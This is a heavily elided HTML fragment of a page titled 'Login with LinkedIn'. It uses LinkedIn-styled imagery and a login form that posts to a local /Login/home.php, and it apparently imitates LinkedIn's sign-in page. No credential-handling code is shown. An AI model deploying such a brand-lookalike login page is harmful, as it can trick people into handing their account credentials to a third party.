<html>
    <head><title>Login with LinkedIn</title></head>
    <style>
        body {
	margin: 0;
...
html { 
  background: url(/Login/images/linkedin_wall.jpg) no-repeat center center fixed; 
  ...
  <main class="app__content">
    ...
    <form class="login__form" action="/Login/home.php" method="post">
      ...
      <div class="login__form_action_container login__form_action_container--multiple-actions">
        ...
        <button class="btn__secondary--large from__button--floating" aria-label="Cancel"><a href="index.php">Cancel</a></button>
      </div>
    </form>
...
<script>document.getElementById("input--email").addEventListener("focus", function() {
